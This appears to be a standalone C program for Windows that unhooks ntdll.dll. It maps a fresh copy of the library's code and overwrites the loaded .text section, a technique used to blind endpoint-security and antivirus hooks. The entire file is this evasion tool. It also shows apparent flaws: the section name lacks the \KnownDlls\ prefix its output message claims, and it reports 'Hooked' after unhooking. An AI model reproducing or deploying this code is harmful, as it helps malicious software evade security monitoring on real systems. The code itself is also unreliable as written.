#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>

#define NtDLL L"NTDLL.DLL"

typedef NTSTATUS(NTAPI* section) (
    OUT PHANDLE             SectionHandle,
    IN  ACCESS_MASK         DesiredAccess,
    IN  POBJECT_ATTRIBUTES  ObjectAttributes
    );

unsigned char func[] = { 'N','t','O','p','e','n','S','e','c','t','i','o','n', 0 }; // Note the null terminator at the end

BOOL MapNtDLLFromKnownDlls(OUT PVOID* ppNtdllBuffer) {
    HANDLE hSection = NULL;
    PBYTE pNtdllBuffer = NULL;
    NTSTATUS STATUS = NULL;

    UNICODE_STRING UniStr = { 0 };
    OBJECT_ATTRIBUTES ObjAtr = { 0 };

    UniStr.Buffer = (PWSTR)NtDLL;
    UniStr.Length = (USHORT)(wcslen(NtDLL) * sizeof(WCHAR));
    UniStr.MaximumLength = UniStr.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&ObjAtr, &UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

    section address = (section)GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), (LPCSTR)func); // Cast to section type

    if (address == NULL) {
        printf("[!] GetProcAddress failed [!]\n");
        return FALSE;
    }

    STATUS = address(&hSection, FILE_MAP_READ, &ObjAtr);

    if (STATUS != 0x00) {
        printf("[!] Error in Opening SECTION [!]\n");
        goto _EndOfFunc;
    }

    pNtdllBuffer = (PBYTE)MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);

    if (pNtdllBuffer == NULL) {
        printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        goto _EndOfFunc;
    }

    *ppNtdllBuffer = pNtdllBuffer;

_EndOfFunc:
    if (hSection)
        CloseHandle(hSection);
    if (*ppNtdllBuffer == NULL)
        return FALSE;
    else
        return TRUE;
}

PVOID FetchLocalNtdllAddress() {
#ifdef _WIN64
    PPEB PEB = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB PEB = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)PEB->Ldr->InMemoryOrderModuleList.Flink->Flink - 0X10);
    return pLdr->DllBase;
}

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookDLL) {
    PVOID pLocalNtdll = (PVOID)FetchLocalNtdllAddress();
    PIMAGE_DOS_HEADER pLocalDOSHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;

    if (pLocalDOSHdr && pLocalDOSHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pLocalNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDOSHdr->e_lfanew);

    if (pLocalNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    PVOID pLocalNtdllTxt = NULL,
        pRemoteNtdllTxt = NULL;

    SIZE_T sNtdllTxtSize = NULL;

    PIMAGE_SECTION_HEADER pSectionHdr = IMAGE_FIRST_SECTION(pLocalNtHdr);

    for (int i = 0; i < pLocalNtHdr->FileHeader.NumberOfSections; i++) {
        if ((*(ULONG*)pSectionHdr[i].Name | 0x20202020) == 'xet.') {
            pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHdr[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookDLL + pSectionHdr[i].VirtualAddress);
            sNtdllTxtSize = pSectionHdr[i].Misc.VirtualSize;
            break;
        }
    }

    if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize) {
        return FALSE;
    }

    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
        return FALSE;
    }

    DWORD OldProtection = NULL;

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &OldProtection)) {
        printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, OldProtection, &OldProtection)) {
        printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

int main(int argc, char* argv[]) {
    PVOID pNtdll = NULL;

    printf("[i] Fetching A New \"ntdll.dll\" File from \"\\KnownDlls\\\" \n");

    if (!MapNtDLLFromKnownDlls(&pNtdll)) {
        return -1;
    }

    if (!ReplaceNtdllTxtSection(pNtdll)) {
        return -1;
    }
    UnmapViewOfFile(pNtdll);

    printf("[+] Ntdll Hooked Successfully [+]");
    printf("[>>] PRESS <Enter> To EXIT [<<]");

    getchar();

    return 0;
}
